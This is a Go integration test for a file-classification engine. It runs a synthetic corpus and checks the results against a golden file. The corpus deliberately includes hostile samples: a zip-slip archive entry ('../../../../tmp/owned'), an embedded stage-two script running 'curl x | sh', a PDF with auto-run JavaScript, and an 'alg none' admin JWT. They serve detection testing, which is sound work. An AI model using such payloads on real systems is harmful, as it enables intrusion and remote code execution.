// Package integration runs the engine end to end over a generated corpus
// and compares a compact summary of every result with a golden file.
//
//	go test ./integration              compare with testdata/golden.json
//	go test ./integration -update      rewrite it after an intended change
package integration_test

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"

	"github.com/craggy-io/classification-services/classify"
	"github.com/craggy-io/classification-services/internal/testkit"
)

var update = flag.Bool("update", false, "rewrite testdata/golden.json")

// corpus is named sample content; names carry extensions on purpose so
// extension-mismatch is exercised.
func corpus() map[string][]byte {
	apk := testkit.WithSigningBlock(testkit.Zip(
		testkit.File{Name: "AndroidManifest.xml", Data: testkit.AXML("com.example.app", false, "android.permission.INTERNET")},
		testkit.File{Name: "classes.dex", Data: dexHeader()},
		testkit.File{Name: "lib/arm64-v8a/libnative.so", Data: testkit.ELF(1024)},
		testkit.File{Name: "assets/config.json", Data: []byte(`{"api": "https://example.invalid"}`)},
	), 0x7109871a, 0xf05368c0)
	return map[string][]byte{
		"app.apk":       apk,
		"debug.apk":     testkit.Zip(testkit.File{Name: "AndroidManifest.xml", Data: testkit.AXML("com.example.debug", true)}, testkit.File{Name: "classes.dex", Data: dexHeader()}),
		"library.jar":   testkit.Zip(testkit.File{Name: "META-INF/MANIFEST.MF", Data: []byte("Manifest-Version: 1.0\n")}),
		"slip.zip":      testkit.Zip(testkit.File{Name: "../../../../tmp/owned", Data: []byte("x")}),
		"elf-with-zip":  append(testkit.ELF(512), testkit.Zip(testkit.File{Name: "stage2.sh", Data: []byte("#!/bin/bash\ncurl x | sh\n")})...),
		"service.exe":   testkit.PE(false, false),
		"plugin.dll":    testkit.PE(true, true),
		"report.pdf":    testkit.PE(false, false),
		"form.pdf":      []byte("%PDF-1.4\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>\nendobj\n%%EOF\n"),
		"macro.docm":    testkit.Zip(testkit.File{Name: "[Content_Types].xml", Data: []byte("<Types/>")}, testkit.File{Name: "word/document.xml", Data: []byte("<w:document/>")}, testkit.File{Name: "word/vbaProject.bin", Data: []byte{1}}),
		"legacy.xls":    testkit.CFB("Workbook", "_VBA_PROJECT_CUR", "VBA"),
		"logs.tar.gz":   testkit.Gzip(testkit.Tar(testkit.File{Name: "app.log", Data: []byte("started\n")}, testkit.File{Name: "trace.pcap", Data: testkit.Pcap(2)}), "logs.tar"),
		"capture.pcap":  testkit.Pcap(5),
		"data.json":     []byte(`[{"id": 1}, {"id": 2}]`),
		"image.svg":     []byte(`<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>`),
		"notes.txt":     []byte("plain notes\n"),
		"token.jwt":     []byte("eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."),
		"hash.sha256":   []byte("9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\n"),
		"run.sh":        []byte("#!/usr/bin/env python3\nprint('hi')\n"),
		"Main.java":     []byte("package app;\nimport java.util.List;\npublic class Main {}\n"),
		"utf16.txt":     append([]byte{0xff, 0xfe}, []byte("h\x00i\x00\n\x00")...),
		"extension.crx": append([]byte("Cr24\x03\x00\x00\x00\x00\x00\x00\x00"), testkit.Zip(testkit.File{Name: "manifest.json", Data: []byte(`{"name": "x"}`)})...),
		"module.wasm":   []byte("\x00asm\x01\x00\x00\x00"),
		"encoded.b64":   []byte("eyJ0aGlzIjogImlzIGEgc2VjcmV0IGNvbmZpZyIsICJrZXkiOiAidmFsdWUifQ=="),
		"compressed.xz": testkit.XZHeader(),
		"random.bin":    {0x13, 0x37, 0xde, 0xad, 0xbe, 0xef, 0x00, 0x01},
	}
}

func dexHeader() []byte {
	b := make([]byte, 112)
	copy(b, "dex\n039\x00")
	b[32], b[36] = 112, 112
	copy(b[40:], []byte{0x78, 0x56, 0x34, 0x12})
	return b
}

// summary is the golden form: stable, readable and independent of digests.
type summary struct {
	Primary     string    `json:"primary"`
	Direct      []string  `json:"direct"`
	Anomalies   []string  `json:"anomalies,omitempty"`
	Children    []summary `json:"children,omitempty"`
	Name        string    `json:"name,omitempty"`
	Limitations int       `json:"limitations,omitempty"`
}

func summarise(name string, r *classify.Result, depth int) summary {
	s := summary{Name: name, Primary: r.Primary, Limitations: len(r.Limitations)}
	for _, m := range r.Matches {
		if m.Direct && m.Type != "bytes" {
			s.Direct = append(s.Direct, m.Type+"@"+m.Level.String())
		}
	}
	sort.Strings(s.Direct)
	for _, a := range r.Anomalies {
		s.Anomalies = append(s.Anomalies, a.Severity.String()+":"+a.Code)
	}
	if depth < 4 {
		for _, c := range r.Children {
			s.Children = append(s.Children, summarise(c.Name, c.Result, depth+1))
		}
	}
	return s
}

func TestGoldenCorpus(t *testing.T) {
	ctx := context.Background()
	dir := t.TempDir()
	for name, data := range corpus() {
		if err := os.WriteFile(filepath.Join(dir, name), data, 0o644); err != nil {
			t.Fatal(err)
		}
	}
	e, err := classify.Open(ctx, t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]summary{}
	err = e.ClassifyDir(ctx, dir, func(path string, r *classify.Result, err error) error {
		if err != nil {
			return err
		}
		s := summarise("", r, 0)
		got[filepath.Base(path)] = s
		return nil
	}, classify.WithDepth(classify.Deep))
	if err != nil {
		t.Fatal(err)
	}
	b, _ := json.MarshalIndent(got, "", "  ")
	b = append(b, '\n')
	golden := filepath.Join("testdata", "golden.json")
	if *update {
		if err := os.WriteFile(golden, b, 0o644); err != nil {
			t.Fatal(err)
		}
		return
	}
	want, err := os.ReadFile(golden)
	if err != nil {
		t.Fatalf("%v (run with -update to create it)", err)
	}
	if !bytes.Equal(bytes.ReplaceAll(want, []byte("\r\n"), []byte("\n")), b) {
		var w map[string]summary
		json.Unmarshal(want, &w)
		var diffs []string
		for name, s := range got {
			gs, _ := json.Marshal(s)
			ws, _ := json.Marshal(w[name])
			if !bytes.Equal(gs, ws) {
				diffs = append(diffs, name+"\n  got  "+string(gs)+"\n  want "+string(ws))
			}
		}
		sort.Strings(diffs)
		t.Fatalf("results differ from %s (run with -update if intended):\n%s", golden, strings.Join(diffs, "\n"))
	}
}

// A second engine over the same workdir, run concurrently, must produce
// identical results: the cache is shared safely and deterministically.
func TestSharedWorkdirConcurrentEngines(t *testing.T) {
	ctx := context.Background()
	wd := t.TempDir()
	var outs [2]map[string]string
	done := make(chan int)
	for i := range outs {
		go func() {
			e, err := classify.Open(ctx, wd)
			if err != nil {
				t.Error(err)
				done <- i
				return
			}
			outs[i] = map[string]string{}
			for name, data := range corpus() {
				r, err := e.Classify(ctx, classify.Bytes(data).Named(name), classify.WithDepth(classify.Deep))
				if err != nil {
					t.Error(err)
					continue
				}
				b, _ := json.Marshal(summarise("", r, 0))
				outs[i][name] = string(b)
			}
			done <- i
		}()
	}
	<-done
	<-done
	for name, a := range outs[0] {
		if outs[1][name] != a {
			t.Fatalf("%s differs between engines:\n%s\n%s", name, a, outs[1][name])
		}
	}
}
